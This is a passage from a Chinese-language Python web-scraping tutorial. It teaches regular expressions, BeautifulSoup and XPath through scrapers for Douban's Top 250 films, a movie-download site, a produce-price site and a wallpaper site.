&quot;我的电话10086，我女朋友的电话10010&quot;)for i in it:    print(i)    print(i.group())\n\n\n​    3、search，找到一个结果就返回，返回的结果是match对象，拿数据需要.group()\ns = re.search(r&quot;\\d+&quot;, &quot;我的电话10086，我女朋友的电话10010&quot;)print(s.group()) # 10086print(&#x27;\\n&#x27;)\n\n​    4、match，从头开始匹配\ns1 = re.match(r&quot;\\d+&quot;, &quot;10086，我女朋友的电话10010&quot;)print(s1.group()) # 10086print(&#x27;\\n&#x27;)\n\n​    5、compile，预加载正则表达式\nobj = re.compile(r&quot;\\d+&quot;)ret = obj.finditer(&quot;我的电话10086，我女朋友的电话10010&quot;)for i in ret:    print(i.group())\n\n\n​    6、正则中的内容如何单独提取? 单独获取到正则中的具体内容可以给分组起名字\nimport res = &quot;&quot;&quot;&lt;div class=&#x27;jay&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;周杰伦&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;jj&#x27;&gt;&lt;span id=&#x27;2&#x27;&gt;林俊杰&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;jolin&#x27;&gt;&lt;span id=&#x27;3&#x27;&gt;蔡依林&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;sylar&#x27;&gt;&lt;span id=&#x27;4&#x27;&gt;玛卡巴卡&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;tory&#x27;&gt;&lt;span id=&#x27;5&#x27;&gt;唔西迪西&lt;/span&gt;&lt;/div&gt;&quot;&quot;&quot;# re.S：让 . 可以匹配换行符obj = re.compile(r&quot;&lt;div class=&#x27;.*?&#x27;&gt;&lt;span id=&#x27;\\d+&#x27;&gt;.*?&lt;/span&gt;&lt;/div&gt;&quot;, re.S)result = obj.finditer(s)for it in result:    print(it.group())\n\n​    按照之前的办法，我们看到的只是这样\n\n​    我们在组里加上(?P&lt;wahaha&gt;)这类相当于给组起名字，然后通过组拿到起名的内容，便可得到我们想要的结果。\nimport res = &quot;&quot;&quot;&lt;div class=&#x27;jay&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;周杰伦&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;jj&#x27;&gt;&lt;span id=&#x27;2&#x27;&gt;林俊杰&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;jolin&#x27;&gt;&lt;span id=&#x27;3&#x27;&gt;蔡依林&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;sylar&#x27;&gt;&lt;span id=&#x27;4&#x27;&gt;玛卡巴卡&lt;/span&gt;&lt;/div&gt;&lt;div class=&#x27;tory&#x27;&gt;&lt;span id=&#x27;5&#x27;&gt;唔西迪西&lt;/span&gt;&lt;/div&gt;&quot;&quot;&quot;# re.S：让 . 可以匹配换行符obj = re.compile(r&quot;&lt;div class=&#x27;.*?&#x27;&gt;&lt;span id=&#x27;\\d+&#x27;&gt;(?P&lt;wahaha&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;, re.S)result = obj.finditer(s)for it in result:    print(it.group(&quot;wahaha&quot;))\n\n\n豆瓣top250电影排行榜\n​    ⽬标: 抓取”电影名称”,”上映年份”,”评分”,”评分⼈数”四项内容.\n​    ⾸先, 先看⼀下⻚⾯源代码. 数据是否是直接怼在源代码上的\n\n​    很明显, 我们想要的数据全部都在⻚⾯源代码中体现了. 所以, 我们不 需要考虑js动态加载数据的情况了. 那么接下来就是编写爬⾍代码的 第⼀步了. 拿到⻚⾯源代码:\nimport requestsheaders = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_4) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.88 Safari/537.36&quot;&#125;url = &quot;https://movie.douban.com/top250?start=0&amp;filter=&quot;resp = requests.get(url, headers=headers)print(resp.text)\n\n​    从⻚⾯源代码中提取我们需要的内容. 这时候我们就可以去写正则了\n# 拿到页面源代码 requests# 通过re来提取想要的信息 reimport reimport requestsurl = &quot;https://movie.douban.com/top250&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;resp = requests.get(url, headers=headers)page_content = resp.text# 解析数据obj = re.compile(r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;&#x27;, re.S)result = obj.finditer(page_content)for it in result:    print(it.group(&quot;name&quot;))\n\n\n​    可以看到已经获取了名字，下面我们继续写其他的\n# 拿到页面源代码 requests# 通过re来提取想要的信息 reimport reimport requestsurl = &quot;https://movie.douban.com/top250&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;resp = requests.get(url, headers=headers)page_content = resp.text# 解析数据obj = re.compile(r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;.*?&#x27;                 r&#x27;&lt;p class=&quot;&quot;&gt;.*?&lt;br&gt;(?P&lt;year&gt;.*?)&amp;nbsp.*?&#x27;                 r&#x27;&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(?P&lt;score&gt;.*?)&lt;/span&gt;.*?&#x27;                 r&#x27;&lt;span&gt;(?P&lt;num&gt;.*?)人评价&lt;/span&gt;&#x27;, re.S)result = obj.finditer(page_content)for it in result:    print(it.group(&quot;name&quot;))    print(it.group(&quot;score&quot;))    print(it.group(&quot;num&quot;))    print(it.group(&quot;year&quot;).strip())\n\n\n​    保存到文件\n# 拿到页面源代码 requests# 通过re来提取想要的信息 reimport csvimport reimport requestsurl = &quot;https://movie.douban.com/top250&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;resp = requests.get(url, headers=headers)page_content = resp.text# 解析数据obj = re.compile(r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;.*?&#x27;                 r&#x27;&lt;p class=&quot;&quot;&gt;.*?&lt;br&gt;(?P&lt;year&gt;.*?)&amp;nbsp.*?&#x27;                 r&#x27;&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(?P&lt;score&gt;.*?)&lt;/span&gt;.*?&#x27;                 r&#x27;&lt;span&gt;(?P&lt;num&gt;.*?)人评价&lt;/span&gt;&#x27;, re.S)result = obj.finditer(page_content)f = open(&quot;data.csv&quot;, &quot;w&quot;)csvwriter = csv.writer(f)for it in result:    # print(it.group(&quot;name&quot;))    # print(it.group(&quot;score&quot;))    # print(it.group(&quot;num&quot;))    # print(it.group(&quot;year&quot;).strip())    dic = it.groupdict()    dic[&#x27;year&#x27;] = dic[&#x27;year&#x27;].strip()    csvwriter.writerow(dic.values())resp.close()f.close()print(&quot;over!&quot;)\n\n​    目前我们只能抓到前25条。事实上只要修改url变可以拿到全部数据，后续有时间补全。\n电影天堂yyds​    需要以下三步\n​    1、定位到2022必看片\n​    2、从2022必看片中提取到子页面的链接地址\n​    3、请求子页面的链接地址。拿到我们想要的下载地址\nimport requestsdomain = &quot;https://www.dytt89.com/&quot;resp = requests.get(domain)print(resp.text)\n\n​    先拿到页面数据，应该是这样的\n\n​    如果报错的话，设置verify=False，且设置编码格式\nimport requestsdomain = &quot;https://www.dytt89.com/&quot;resp = requests.get(domain, verify=False)resp.encoding = &#x27;gb2312&#x27;print(resp.text)\n\n\n​    然后拿到ul里的li，也就是2022必看热片里的内容\nimport reimport requestsdomain = &quot;https://www.dytt89.com/&quot;resp = requests.get(domain, verify=False)resp.encoding = &#x27;gb2312&#x27;obj1 = re.compile(r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;, re.S)result1 = obj1.finditer(resp.text)for it in result1:    ul = it.group(&#x27;ul&#x27;)    print(ul)\n\n\n​    接下类进行第二件事，从2022必看片中提取到子页面的链接地址\n\nimport reimport requestsdomain = &quot;https://www.dytt89.com/&quot;resp = requests.get(domain, verify=False)resp.encoding = &#x27;gb2312&#x27;# 拿到ul里的liobj1 = re.compile(r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;, re.S)obj2 = re.compile(r&quot;&lt;a href=&#x27;(?P&lt;href&gt;.*?)&#x27;&quot;,re.S)result1 = obj1.finditer(resp.text)for it in result1:    ul = it.group(&#x27;ul&#x27;)# 提取子页面链接    result2 = obj2.finditer(ul)    for itt in result2:        print(itt.group(&#x27;href&#x27;))\n\n\nimport reimport requestsdomain = &quot;https://www.dytt89.com/&quot;resp = requests.get(domain, verify=False)resp.encoding = &#x27;gb2312&#x27;# 拿到ul里的liobj1 = re.compile(r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;, re.S)obj2 = re.compile(r&quot;&lt;a href=&#x27;(?P&lt;href&gt;.*?)&#x27;&quot;, re.S)obj3 = re.compile(r&#x27;◎片　　名(?P&lt;movie&gt;.*?)&lt;br /&gt;.*? &lt;td &#x27;                  r&#x27;style=&quot;WORD-WRAP: break-word&quot; bgcolor=&quot;#fdfddf&quot;&gt;&lt;a href=&quot;(?P&lt;download&gt;.*?)&quot;&gt;&#x27;, re.S)result1 = obj1.finditer(resp.text)child_href_list = []for it in result1:    ul = it.group(&#x27;ul&#x27;)    # 提取子页面链接    result2 = obj2.finditer(ul)    for itt in result2:        # 拼接子页面的url地址：域名 + 子页面地址        child_href = domain + itt.group(&#x27;href&#x27;).strip(&quot;/&quot;)        child_href_list.append(child_href)# 提取子页面内容for href in child_href_list:    child_resp = requests.get(href, verify=False)    child_resp.encoding = &#x27;gb2312&#x27;    result3 = obj3.search(child_resp.text)    print(result3.group(&quot;movie&quot;))    print(result3.group(&quot;download&quot;))\n\n\nimport aifcimport csvimport reimport requestsdomain = &quot;https://www.dytt89.com/&quot;resp = requests.get(domain)resp.encoding = &#x27;gb2312&#x27;# 拿到ul里的liobj1 = re.compile(r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;, re.S)obj2 = re.compile(r&quot;&lt;a href=&#x27;(?P&lt;href&gt;.*?)&#x27;&quot;, re.S)obj3 = re.compile(r&#x27;◎片　　名(?P&lt;movie&gt;.*?)&lt;br /&gt;.*? &lt;td &#x27;                  r&#x27;style=&quot;WORD-WRAP: break-word&quot; bgcolor=&quot;#fdfddf&quot;&gt;&lt;a href=&quot;(?P&lt;download&gt;.*?)&quot;&gt;&#x27;, re.S)result1 = obj1.finditer(resp.text)child_href_list = []f = open(&quot;dytt.csv&quot;, &quot;w&quot;)csvwrite1 = csv.writer(f)for it in result1:    ul = it.group(&#x27;ul&#x27;)    # 提取子页面链接    result2 = obj2.finditer(ul)    for itt in result2:        # 拼接子页面的url地址：域名 + 子页面地址        child_href = domain + itt.group(&#x27;href&#x27;).strip(&quot;/&quot;)        child_href_list.append(child_href)# 提取子页面内容for href in child_href_list:    child_resp = requests.get(href)    child_resp.encoding = &#x27;gb2312&#x27;    result3 = obj3.finditer(child_resp.text)    for ittt in result3:        print(ittt.group(&quot;movie&quot;))        print(ittt.group(&quot;download&quot;))        dic = ittt.groupdict()        csvwrite1.writerow(dic.values())resp.close()f.close()print(&quot;over&quot;)\n\n\nbs4解析前戏-html语法规则​    HTML(Hyper Text Markup Language)超⽂本标记语⾔, 是我们编写 ⽹⻚的最基本也是最核⼼的⼀种语⾔. 其语法规则就是⽤不同的标签 对⽹⻚上的内容进⾏标记, 从⽽使⽹⻚显示出不同的展示效果. \n&lt;h1&gt; 我爱你&lt;/h1&gt;\n\n​    上述代码的含义是在⻚⾯中显示”我爱你”三个字, 但是我爱你三个字 被”&lt;h1&gt;“和&lt;h1&gt;标记了. ⽩话就是被括起来了. 被H1这个标签括 起来了. 这个时候. 浏览器在展示的时候就会让我爱你变粗变⼤. 俗称 标题, 所以HTML的语法就是⽤类似这样的标签对⻚⾯内容进⾏标记. 不同的标签表现出来的效果也是不⼀样的.\nh1: ⼀级标题h2: ⼆级标题p: 段落font: 字体(被废弃了, 但能⽤)body: 主体\n\n​    标签我们明⽩了, 接下来就是属性了\n&lt;h1&gt; 我爱你&lt;/h1&gt;&lt;h1 align=&#x27;right&#x27;&gt; 我爱你妹&lt;/h1&gt;\n\n​    这两个标签都是h1标签, 都是⼀级标题, 但是下⾯这个会显示 在右边. 也就是说, 通过xxx=xxx这种形式对h1标签进⼀步的说明了. 那么这种语法在html中被称为标签的属性. 并且属性可以有很多个.\n&lt;body text=&quot;green&quot; bgcolor=&quot;#eee&quot;&gt; 你看我的颜⾊. 贼健康&lt;/body&gt;\n\n​    有了这些知识, 我们再去看bs4就会得⼼应⼿了. 因为bs4就是通过标 签和属性去定位⻚⾯上的内容的.\n&lt;div id=&quot;1&quot; class-&quot;h1&quot;&gt;周杰伦&lt;/div&gt;&lt;div id=&quot;2&quot; class=&quot;h1&quot;&gt;林俊杰&lt;/div&gt;&lt;div id-&quot;3&quot; class=&quot;h1&quot;&gt;麻花藤&lt;/div&gt;&lt;div id=&quot;4&quot; class=&quot;h1&quot;&gt;天老鸭&lt;/div&gt;&lt;div id-&quot;5&quot; class=&quot;h4&quot;&gt;李多海&lt;/div&gt;&lt;div id=&quot;5&quot; cLass=&quot;h5&quot;&gt;厉害多&lt;/div&gt;&lt;span&gt;XXxxx&lt;/span&gt;＃ 通过标签名称来拿到数据# div -&gt; id:3 =&gt; 麻花藤# div -&gt; class:h4 =&gt; 李多海# bs4\n\nbs4解析入门-豆瓣top获取​    1、拿到页面源代码，和之前类似\nimport requestsurl = &quot;https://movie.douban.com/top250?start=0&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;resp = requests.get(url, headers=headers)print(resp.text)\n\n​    2、把页面源码交给Beautifulsoup处理，生成bs对象\n# 1、把页面源码交给Beautifulsoup处理，生成bs4对象page = BeautifulSoup(resp.text)\n\n\n​    这是因为bs不知道是什么类型的源码，会先当成html解析。我们告诉他是html即可消除\n​    3、从bs对象中查找数据\n​    find(标签，属性=值) 只找第一个\n​    find_all(标签，属性=值) 全部都找\n# 1、拿到页面源代码# 2、使用bs4进行解析，拿到数据import requestsfrom bs4 import BeautifulSoupurl = &quot;https://movie.douban.com/top250?start=0&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;resp = requests.get(url, headers=headers)# 解析数据# 1、把页面源码交给Beautifulsoup处理，生成bs4对象page = BeautifulSoup(resp.text, &quot;html.parser&quot;)  # 指定html解析器# 2、从bs对象中查找数据# find(标签，属性=值) 只找第一个# find_all(标签，属性=值) 全部都找title = page.find(&quot;span&quot;, class_=&quot;title&quot;)  # class是python的关键字，所以要换个写法print(title)\n\n\n​    另一种写法：\n# 1、拿到页面源代码# 2、使用bs4进行解析，拿到数据import requestsfrom bs4 import BeautifulSoupurl = &quot;https://movie.douban.com/top250?start=0&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;resp = requests.get(url, headers=headers)# 解析数据# 1、把页面源码交给Beautifulsoup处理，生成bs4对象page = BeautifulSoup(resp.text, &quot;html.parser&quot;)  # 指定html解析器# 2、从bs对象中查找数据# find(标签，属性=值) 只找第一个# find_all(标签，属性=值) 全部都找# title = page.find(&quot;span&quot;, class_=&quot;title&quot;)  # class是python的关键字，所以要换个写法title = page.find(&quot;span&quot;, attrs=&#123;&quot;class&quot;: &quot;title&quot;&#125;)print(title)resp.close()\n\nbs4解析入门-新发地爬虫​    这是最开始的程序：\nimport requestsfrom bs4 import BeautifulSoupimport csvresp = requests.get(&quot;http://www.xinfadi.com.cn/marketanalysis/0/list/1.shtml&quot;)page = BeautifulSoup(resp.text,&quot;html.paser&quot;)table = page.find(&quot;table&quot;, class_=&quot;hq_table&quot;)f = open(&quot;新发地.csv&quot;, mode=&quot;w&quot;, encoding=&quot;utf-8&quot;)cv_writer = csv.writer(f)# 提取到所有trtr_list = table.find_all(&quot;tr&quot;)[1:] # 注意,第⼀⾏并不是我想要的数据. (第⼀⾏是表头)for tr in tr_list:\ttd_list = tr.find_all(&quot;td&quot;)\tname = td_list[0].text # 获取⽂本内容\tlow = td_list[1].text\tavg = td_list[2].text\thigh = td_list[3].text\tgui = td_list[4].text\tdan = td_list[5].text\tday = td_list[6].text\tcv_writer.writerow([name, low, avg, high,gui, dan, day])f.close()print(&quot;搞定&quot;)\n\n​    去看的时候已经改掉了，改成了前端js渲染，这里也写一个小爬虫，可自行参考\nimport requestsfrom bs4 import BeautifulSoupurl = &quot;http://www.xinfadi.com.cn/getPriceData.html&quot;headers = &#123;    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;                  &quot;Chrome/104.0.0.0 Safari/537.36 &quot;&#125;data = &quot;limit=&amp;current=&amp;pubDateStartTime=&amp;pubDateEndTime=&amp;prodPcatid=&amp;prodCatid=&amp;prodName=&quot;resp = requests.post(url, headers=headers, data=data)respdata = resp.json()pricedata = respdata[&#x27;list&#x27;]for pd in pricedata:    print(&quot;名字: &quot;+pd[&#x27;prodName&#x27;] + &quot; 最低价格: &quot;+pd[&#x27;lowPrice&#x27;]+&quot; 最高价格: &quot;+pd[&#x27;highPrice&#x27;])    resp.close()\n\n\n抓取唯美壁纸图片​    url:https://www.umei.cc/bizhitupian/weimeibizhi/\n\n\n\n​    1.拿到主页面的源代码，拿到链接地址 ,href\nimport requestsurl = &quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;resp = requests.get(url)resp.encoding = &#x27;utf-8&#x27;print(resp.text)\n\n​    2.源代码交给bs\nmain_page = BeautifulSoup(resp.text, &quot;html.parser&quot;)alist = main_page.find(&quot;div&quot;, class_=&quot;pic-box&quot;).find_all(&quot;a&quot;)print(alist)\n\n​    3.拼接url拿到子链接地址\n# 1.拿到主页面的源代码，拿到链接地址 ,href# 2、通过href拿到子页面的内容，从子页面中找到图片的下载地址  img -&gt; src# 3、下载图片import requestsfrom bs4 import BeautifulSoupchild_href_list = []urlhome = &quot;https://www.umei.cc&quot;url = &quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;resp = requests.get(url)resp.encoding = &#x27;utf-8&#x27;# 源代码交给bsmain_page = BeautifulSoup(resp.text, &quot;html.parser&quot;)alist = main_page.find(&quot;div&quot;, class_=&quot;pic-box&quot;).find_all(&quot;a&quot;)# print(alist)# for a in alist:#     print(a.get(&#x27;href&#x27;))  # 拿到的是href里的值for hrefList in alist:    child_href = urlhome + hrefList.get(&#x27;href&#x27;)    child_href_list.append(child_href)print(child_href_list)\n\n\n​    看看子页面\n\n​    提取子页面内容\n# 1.拿到主页面的源代码，拿到链接地址 ,href# 2、通过href拿到子页面的内容，从子页面中找到图片的下载地址  img -&gt; src# 3、下载图片import requestsfrom bs4 import BeautifulSoupchild_href_list = []urlhome = &quot;https://www.umei.cc&quot;url = &quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;resp = requests.get(url)resp.encoding = &#x27;utf-8&#x27;# 源代码交给bsmain_page = BeautifulSoup(resp.text, &quot;html.parser&quot;)alist = main_page.find(&quot;div&quot;, class_=&quot;pic-box&quot;).find_all(&quot;a&quot;)# print(alist)# for a in alist:#     print(a.get(&#x27;href&#x27;))  # 拿到的是href里的值for hrefList in alist:    href = hrefList.get(&#x27;href&#x27;)    if href:        child_href = urlhome + href        child_href_list.append(child_href)# print(child_href_list)# 提取子页面内容for href in child_href_list:    child_resp = requests.get(href)    child_resp.encoding = &#x27;utf-8&#x27;    child_page_text = child_resp.text    # print(child_page_text)    child_page = BeautifulSoup(child_page_text, &quot;html.parser&quot;)    img = child_page.find(&quot;section&quot;, class_=&quot;img-content&quot;).find(&quot;img&quot;)    src = img.get(&quot;src&quot;)    # print(src)\n\n\n# 1.拿到主页面的源代码，拿到链接地址 ,href# 2、通过href拿到子页面的内容，从子页面中找到图片的下载地址  img -&gt; src# 3、下载图片import timeimport requestsfrom bs4 import BeautifulSoupchild_href_list = []urlhome = &quot;https://www.umei.cc&quot;url = &quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;resp = requests.get(url)resp.encoding = &#x27;utf-8&#x27;# 源代码交给bsmain_page = BeautifulSoup(resp.text, &quot;html.parser&quot;)alist = main_page.find(&quot;div&quot;, class_=&quot;pic-box&quot;).find_all(&quot;a&quot;)# print(alist)# for a in alist:#     print(a.get(&#x27;href&#x27;))  # 拿到的是href里的值for hrefList in alist:    href = hrefList.get(&#x27;href&#x27;)    if href:        child_href = urlhome + href        child_href_list.append(child_href)# print(child_href_list)# 提取子页面内容for href in child_href_list:    child_resp = requests.get(href)    child_resp.encoding = &#x27;utf-8&#x27;    child_page_text = child_resp.text    # print(child_page_text)    child_page = BeautifulSoup(child_page_text, &quot;html.parser&quot;)    img = child_page.find(&quot;section&quot;, class_=&quot;img-content&quot;).find(&quot;img&quot;)    src = img.get(&quot;src&quot;)    # print(src)    # 下载图片    img_resp = requests.get(src)    # img_rest.content  # 这里是字节    img_name = src.split(&quot;/&quot;)[-1]  # 拿到url中的最后一个/以后的内容    with open(&quot;img/&quot; + img_name, mode=&quot;wb&quot;) as f:        f.write(img_resp.content)    print(&quot;over!!&quot;, img_name)    time.sleep(1)resp.close()print(&quot;allover!!&quot;)\n\n​    如果很卡，可能在pycharm里选择，这样pycharm就不会作索引，会变快一点\n\nXpath入门​    XPath是⼀⻔在 XML ⽂档中查找信息的语⾔. XPath可⽤来在 XML ⽂档中对元素和属性进⾏遍历. ⽽我们熟知的HTML恰巧属于XML的 ⼀个⼦集. 所以完全可以⽤xpath去查找html中的内容\n​    ⾸先, 先了解⼏个概念.\n&lt;book&gt; &lt;id&gt;1&lt;/id&gt; &lt;name&gt;野花遍地⾹&lt;/name&gt; &lt;price&gt;1.23&lt;/price&gt; &lt;author&gt; &lt;nick&gt;周⼤强&lt;/nick&gt; &lt;nick&gt;周芷若&lt;/nick&gt; &lt;/author&gt;&lt;/book&gt;\n\n​    在上述html中\n1. book, id, name, price....都被称为节点. \n1.  Id, name, price, author被称为book的⼦节点 \n1.  book被称为id, name, price, author的⽗节点  \n1.  id, name, price,author被称为同胞节点 \n\n​     有了这些基础知识后, 我们就可以开始了解xpath的基本语法了 在python中想要使⽤xpath, 需要安装lxml模块.\npip3 install lxml\n\n​    ⽤法: \n1. 将要解析的html内容构造出etree对象. \n1.  使⽤etree对象的xpath()⽅法配合xpath表达式来完成对数据的提取\n\nfrom lxml import etreexml = &quot;&quot;&quot;&lt;book&gt;    &lt;id&gt;1&lt;/id&gt;    &lt;name&gt;野花遍地⾹&lt;/name&gt;    &lt;price&gt;1.23&lt;/price&gt;    &lt;nick&gt;臭⾖腐&lt;/nick&gt;    &lt;author&gt;        &lt;nick id=&quot;10086&quot;&gt;周⼤强&lt;/nick&gt;        &lt;nick id=&quot;10010&quot;&gt;周芷若&lt;/nick&gt;        &lt;nick class=&quot;joy&quot;&gt;周杰伦&lt;/nick&gt;        &lt;nick class=&quot;jolin&quot;&gt;蔡依林&lt;/nick&gt;        &lt;div&gt;            &lt;nick&gt;惹了&lt;/nick&gt;        &lt;/div&gt;    &lt;/author&gt;    &lt;partner&gt;        &lt;nick id=&quot;ppc&quot;&gt;胖胖陈&lt;/nick&gt;        &lt;nick id=&quot;ppbc&quot;&gt;胖胖不陈&lt;/nick&gt;   &lt;/partner&gt;&lt;/book&gt;&quot;&quot;&quot;tree = etree.XML(xml)# result = tree.xpath(&quot;/book&quot;)  # /表示层级关系，第一个/是根节点# result = tree.xpath(&quot;/book/name&quot;)# result = tree.xpath(&quot;/book/name/text()&quot;)  # text() 拿文本result = tree.xpath(&quot;/book/author/nick/text()&quot;) # [&#x27;周⼤强&#x27;, &#x27;周芷若&#x27;, &#x27;周杰伦&#x27;, &#x27;蔡依林&#x27;]print(result)\n\nfrom lxml import etreexml = &quot;&quot;&quot;&lt;book&gt;    &lt;id&gt;1&lt;/id&gt;    &lt;name&gt;野花遍地⾹&lt;/name&gt;    &lt;price&gt;1.23&lt;/price&gt;    &lt;nick&gt;臭⾖腐&lt;/nick&gt;    &lt;author&gt;        &lt;nick id=&quot;10086&quot;&gt;周⼤强&lt;/nick&gt;        &lt;nick id=&quot;10010&quot;&gt;周芷若&lt;/nick&gt;        &lt;nick class=&quot;joy&quot;&gt;周杰伦&lt;/nick&gt;        &lt;nick class=&quot;jolin&quot;&gt;蔡依林&lt;/nick&gt;        &lt;div&gt;            &lt;nick&gt;热热热热&lt;/nick&gt;        &lt;/div&gt;        &lt;div&gt;            &lt;nick&gt;热热热热2&lt;/nick&gt;            &lt;div&gt;                &lt;nick&gt;热热热热3&lt;/nick&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/author&gt;    &lt;partner&gt;        &lt;nick id=&quot;ppc&quot;&gt;胖胖陈&lt;/nick&gt;        &lt;nick id=&quot;ppbc&quot;&gt;胖胖不陈&lt;/nick&gt;   &lt;/partner&gt;&lt;/book&gt;&quot;&quot;&quot;tree = etree.XML(xml)# result = tree.xpath(&quot;/book&quot;)  # /表示层级关系，第一个/是根节点# result = tree.xpath(&quot;/book/name&quot;)# result = tree.xpath(&quot;/book/name/text()&quot;)  # text() 拿文本# result = tree.xpath(&quot;/book/author/nick/text()&quot;)  # [&#x27;周⼤强&#x27;, &#x27;周芷若&#x27;, &#x27;周杰伦&#x27;, &#x27;蔡依林&#x27;]# result = tree.xpath(&quot;/book/author//nick/text()&quot;)  # 找到所有后代节点里的nick节点result = tree.xpath(&quot;/book/author/*/nick/text()&quot;)  # *任意的节点. 通配符print(result)\n\n​    找到所有后代节点里的nick节点：\n\n​    *任意的节点. 通配符\n\n​    xpath如何提取属性信息. 上⼀段真实的HTML来给各位讲解⼀ 下 准备HTML：\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot; /&gt;\t&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\t&lt;ul&gt;\t\t&lt;li&gt;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&lt;/li&gt;\t\t&lt;li&gt;&lt;a href=&quot;http://www.google.com&quot;&gt;⾕歌&lt;/a&gt;&lt;/li&gt;\t\t&lt;li&gt;&lt;a href=&quot;http://www.sogou.com&quot;&gt;搜狗&lt;/a&gt;&lt;/li&gt;\t&lt;/ul&gt;\t&lt;ol&gt;\t\t&lt;li&gt;&lt;a href=&quot;feiji&quot;&gt;⻜机&lt;/a&gt;&lt;/li&gt;\t\t&lt;li&gt;&lt;a href=&quot;dapao&quot;&gt;⼤炮&lt;/a&gt;&lt;/li&gt;\t\t&lt;li&gt;&lt;a href=&quot;huoche&quot;&gt;⽕⻋&lt;/a&gt;&lt;/li&gt;\t&lt;/ol&gt;\t&lt;div class=&quot;job&quot;&gt;李嘉诚&lt;/div&gt;\t&lt;div class=&quot;common&quot;&gt;胡辣汤&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n​    注意xpath的顺序是从1开始的,[]表示索引:\nfrom lxml import etreetree = etree.parse(&quot;a.html&quot;)# result = tree.xpath(&#x27;/html&#x27;)result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引print(result)\n\n\n​    [@xxx=xxx]属性的筛选\nfrom lxml import etreetree = etree.parse(&quot;a.html&quot;)# result = tree.xpath(&#x27;/html&#x27;)# result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引result = tree.xpath(&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;) # [@xxx=xxx]属性的筛选print(result)\n\n\n​    从每一个li提取文字信息\nfrom lxml import etreetree = etree.parse(&quot;a.html&quot;)# result = tree.xpath(&#x27;/html&#x27;)# result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引# result = tree.xpath(&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;) # [@xxx=xxx]属性的筛选ol_li_list = tree.xpath(&quot;/html/body/ol/li&quot;)for li in ol_li_list:    # 从每一个li提取文字信息    result = li.xpath(&quot;./a/text()&quot;)  # 在li中继续寻找，相对查找    print(result)\n\n\n​    在li中找到a标签里href里的值\nfrom lxml import etreetree = etree.parse(&quot;a.html&quot;)# result = tree.xpath(&#x27;/html&#x27;)# result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 